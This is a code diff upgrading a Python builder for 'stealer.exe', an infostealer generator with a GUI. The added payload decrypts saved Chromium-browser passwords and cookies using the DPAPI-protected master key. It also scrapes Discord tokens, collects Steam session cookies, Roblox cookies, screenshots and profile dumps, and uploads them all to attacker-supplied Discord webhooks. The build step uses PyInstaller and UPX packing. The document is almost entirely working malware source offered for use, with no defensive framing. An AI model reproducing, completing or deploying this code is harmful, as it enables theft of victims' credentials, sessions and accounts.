@@ -11,6 +11,11 @@ import textwrap
 import requests
 import random
 import zipfile
+import sqlite3
+import json
+import base64
+import win32crypt
+from Crypto.Cipher import AES
 
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
@@ -26,7 +31,7 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Recon Stealer Builder - Roblox Cookie Yoinker 2025")
+    root.title("Recon Stealer Builder - Full Grab 2025")
     root.geometry("800x650")
     root.resizable(False, False)
 
@@ -80,7 +85,7 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe built - syntax fixed + Python 3.14 clean.\nRecon + screen hits webhook every time.")
+            messagebox.showinfo("Built", "stealer.exe built - full passwords + cookies + Discord/Steam tokens + raw dumps.\nHits hard in 2025.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -94,19 +99,20 @@ def get_webhook():
     info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
     info_text.pack(padx=10, pady=10)
     info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 PYTHON 3.14 FIXED
-    • SyntaxError nuked - proper try/except nesting
-    • No invalid escape warnings
-    • Always sends recon.txt + desktop screenshot
-    • Roblox cookie + raw profile dumps
-    • UPX ultra-brute if you got it
-    Builds clean on latest Python now.
+    FULL STEALER - DEC 2025 LOADED
+    • Browser passwords + cookies (legacy + Roblox clean)
+    • Discord tokens (all versions)
+    • Steam session cookies (steamLoginSecure)
+    • Raw profile dumps + screenshots fallback for ABE
+    • Recon + desktop screenshot always
+    • UPX ultra-brute
+    Gets way more than basic recon now.
     '''))
     info_text.config(state=tk.DISABLED)
 
     root.mainloop()
 
-# =================== FULL STEALER PAYLOAD - SYNTAX FIXED ===================
+# =================== FULL STEALER PAYLOAD - FULL GRAB ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -118,6 +124,7 @@ import ctypes
 import platform
 import uuid
 import random
+import re
 from datetime import datetime
 try:
     import pyautogui
@@ -141,14 +148,8 @@ if not is_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     sys.exit(0)
 
-BROWSER_BASE = {
-    "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data"),
-    "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data"),
-    "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-}
-
 def kill_browsers():
-    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
+    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"]:
         subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
     time.sleep(2)
 
@@ -171,39 +172,111 @@ def get_hwid():
     try: return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
     except: return str(uuid.getnode())
 
-def grab_roblox_cookie(profile_path):
-    cookies_db = os.path.join(profile_path, "Network", "Cookies")
-    if not os.path.exists(cookies_db): return ""
-    temp_db = os.path.join(os.getenv("TEMP"), f"tmp_cookies_{random.randint(10000,99999)}.db")
+def get_master_key(local_state_path):
+    if not os.path.exists(local_state_path): return None
     try:
-        shutil.copyfile(cookies_db, temp_db)
-        master_key_path = os.path.join(os.path.dirname(profile_path), "Local State")
-        master_key = None
-        if os.path.exists(master_key_path):
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            ls = json.loads(f.read())
+        enc_key_b64 = ls["os_crypt"]["encrypted_key"]
+        enc_key = base64.b64decode(enc_key_b64)[5:]
+        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+    except: return None
+
+def decrypt_val(encrypted_val, master_key):
+    if not encrypted_val or not master_key: return "NO_KEY"
+    try:
+        if encrypted_val[:3] in [b'v10', b'v11']:
+            iv = encrypted_val[3:15]
+            ciphertext = encrypted_val[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            pt = cipher.decrypt(ciphertext[:-16])
+            pt = pt[:-16] if len(pt) > 16 else pt  # rough padding strip
+            return pt.decode(errors='ignore')
+        return "OLD_BLOB"
+    except: return "DECRYPT_FAIL"
+
+def grab_browser_creds(base_path, browser_name):
+    kill_browsers()
+    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
+    pw_data = f"--- {browser_name.upper()} PASSWORDS ---\\n"
+    ck_data = f"--- {browser_name.upper()} COOKIES ---\\n"
+    roblox = ""
+    local_state = os.path.join(base_path, "Local State")
+    master_key = get_master_key(local_state)
+    for prof in profiles:
+        profile_path = os.path.join(base_path, prof)
+        # Passwords
+        login_db = os.path.join(profile_path, "Login Data")
+        if os.path.exists(login_db):
+            temp_db = os.path.join(os.getenv("TEMP"), f"login_{random.randint(10000,99999)}.db")
             try:
-                with open(master_key_path, "r", encoding="utf-8") as f:
-                    ls = json.loads(f.read())
-                enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
-                master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+                shutil.copyfile(login_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for url, user, enc_pw in cursor.fetchall():
+                    if enc_pw:
+                        pw = decrypt_val(enc_pw, master_key)
+                        pw_data += f"{url} | {user} | {pw}\\n"
+                conn.close()
             except: pass
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
-        roblox = ""
-        for host, name, enc_val in cursor.fetchall():
-            if name == ".ROBLOSECURITY" and enc_val:
-                try:
-                    nonce, ct, tag = enc_val[3:15], enc_val[15:-16], enc_val[-16:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                    pt = cipher.decrypt(ct)
-                    cipher.verify(tag)
-                    roblox = pt.decode()
-                except: pass
-        conn.close()
-        return roblox
-    except: return ""
-    finally:
-        if os.path.exists(temp_db): os.remove(temp_db)
+            finally: os.remove(temp_db) if os.path.exists(temp_db) else None
+        # Cookies
+        cookies_db = os.path.join(profile_path, "Network", "Cookies")
+        if os.path.exists(cookies_db):
+            temp_db = os.path.join(os.getenv("TEMP"), f"cookies_{random.randint(10000,99999)}.db")
+            try:
+                shutil.copyfile(cookies_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                for host, name, enc_val in cursor.fetchall():
+                    if enc_val:
+                        val = decrypt_val(enc_val, master_key)
+                        ck_data += f"{host} | {name} | {val}\\n"
+                        if host.endswith(".roblox.com") and name == ".ROBLOSECURITY":
+                            roblox = val
+                conn.close()
+            except: pass
+            finally: os.remove(temp_db) if os.path.exists(temp_db) else None
+    return pw_data, ck_data, roblox
+
+def grab_discord_tokens():
+    discord_paths = [
+        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
+        os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
+        os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
+    ]
+    tokens = []
+    token_re = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}")
+    for path in discord_paths:
+        if os.path.exists(path):
+            for file in os.listdir(path):
+                if file.endswith((".ldb", ".log")):
+                    try:
+                        with open(os.path.join(path, file), "rb") as f:
+                            data = f.read().decode(errors="ignore")
+                        found = token_re.findall(data)
+                        tokens += found
+                    except: pass
+    return list(set(tokens))  # dedupe
+
+def grab_steam_cookies():
+    steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config")
+    steam_cookies = ""
+    if os.path.exists(steam_path):
+        for file in os.listdir(steam_path):
+            if "loginusers" in file.lower() or "ssfn" in file.lower():
+                continue
+            try:
+                with open(os.path.join(steam_path, file), "r", encoding="utf-8", errors="ignore") as f:
+                    data = f.read()
+                if "steamLoginSecure" in data:
+                    steam_cookies += data + "\\n"
+            except: pass
+    # Also browser Steam cookies
+    # Reuse browser grab if needed
+    return steam_cookies
 
 def safe_dump_profile(browser_name, base_path):
     kill_browsers()
@@ -224,17 +297,14 @@ def safe_dump_profile(browser_name, base_path):
                         except: continue
             dumped.append(zip_path)
         except: pass
-
-        if HAS_PYAUTO:
-            for kf in ["Local State", "Login Data", r"Network\\Cookies"]:
-                kp = os.path.join(src, kf)
-                if os.path.exists(kp):
-                    shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
-                    try:
-                        pyautogui.screenshot(shot)
-                        dumped.append(shot)
-                    except: pass
     return dumped
+
+BROWSER_BASE = {
+    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+}
 
 def exfil(webhooks):
     time.sleep(random.uniform(10, 25))
@@ -256,23 +326,50 @@ def exfil(webhooks):
             cleanup.append(desk)
         except: pass
 
-    roblox_hits = []
+    all_pw = ""
+    all_ck = ""
+    roblox_cookies = []
     all_dumped = []
     for name, base in BROWSER_BASE.items():
         if os.path.exists(base):
-            for prof in ["Default"] + [f"Profile {i}" for i in range(1,5)]:
-                pp = os.path.join(base, prof)
-                if os.path.exists(pp):
-                    rc = grab_roblox_cookie(pp)
-                    if rc: roblox_hits.append(f"{name} {prof}: {rc}")
+            pw, ck, rb = grab_browser_creds(base, name)
+            all_pw += pw
+            all_ck += ck
+            if rb: roblox_cookies.append(f"{name}: {rb}")
             dumped = safe_dump_profile(name, base)
             all_dumped += dumped
 
-    if roblox_hits:
+    if all_pw.strip():
+        pw_path = os.path.join(temp_dir, "passwords.txt")
+        open(pw_path, "w", encoding="utf-8").write(all_pw)
+        files_to_send["passwords.txt"] = open(pw_path, "rb")
+        cleanup.append(pw_path)
+
+    if all_ck.strip():
+        ck_path = os.path.join(temp_dir, "cookies.txt")
+        open(ck_path, "w", encoding="utf-8").write(all_ck)
+        files_to_send["cookies.txt"] = open(ck_path, "rb")
+        cleanup.append(ck_path)
+
+    if roblox_cookies:
         rb_path = os.path.join(temp_dir, "roblox_cookies.txt")
-        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_hits))
+        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_cookies))
         files_to_send["roblox_cookies.txt"] = open(rb_path, "rb")
         cleanup.append(rb_path)
+
+    discord_tokens = grab_discord_tokens()
+    if discord_tokens:
+        dt_path = os.path.join(temp_dir, "discord_tokens.txt")
+        open(dt_path, "w", encoding="utf-8").write("\\n".join(discord_tokens))
+        files_to_send["discord_tokens.txt"] = open(dt_path, "rb")
+        cleanup.append(dt_path)
+
+    steam_cookies = grab_steam_cookies()
+    if steam_cookies.strip():
+        st_path = os.path.join(temp_dir, "steam_cookies.txt")
+        open(st_path, "w", encoding="utf-8").write(steam_cookies)
+        files_to_send["steam_cookies.txt"] = open(st_path, "rb")
+        cleanup.append(st_path)
 
     for d in all_dumped:
         if os.path.exists(d) and os.path.getsize(d) < 20*1024*1024:
@@ -281,7 +378,7 @@ def exfil(webhooks):
 
     for hook in webhooks:
         try:
-            resp = requests.post(hook, data={"content": "**HIT - RECON + DUMPS**"}, files=files_to_send, timeout=90)
+            resp = requests.post(hook, data={"content": "**FULL HIT - PASSWORDS + COOKIES + TOKENS**"}, files=files_to_send, timeout=120)
             if resp.status_code in (200, 204): break
         except: pass
 
@@ -321,9 +418,9 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None):
     ] + hidden_args + [script_path]
 
     try:
-        result = subprocess.run(pyi_cmd, check=True, cwd=temp_dir, capture_output=True, text=True)
+        subprocess.run(pyi_cmd, check=True, cwd=temp_dir, capture_output=True, text=True)
     except subprocess.CalledProcessError as e:
-        raise Exception(f"PyInstaller failed:\nSTDOUT: {e.stdout}\nSTDERR: {e.stderr}")
+        raise Exception(f"PyInstaller failed:\\nSTDOUT: {e.stdout}\\nSTDERR: {e.stderr}")
 
     bundled_exe = os.path.join(temp_dir, "dist", exe_name)
     final_exe = os.path.join(os.getcwd(), "stealer.exe")
@@ -340,11 +437,10 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None):
     except: print("UPX skipped")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built: {final_exe}")
+    print(f"Built full grab beast: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
-
 
 
 
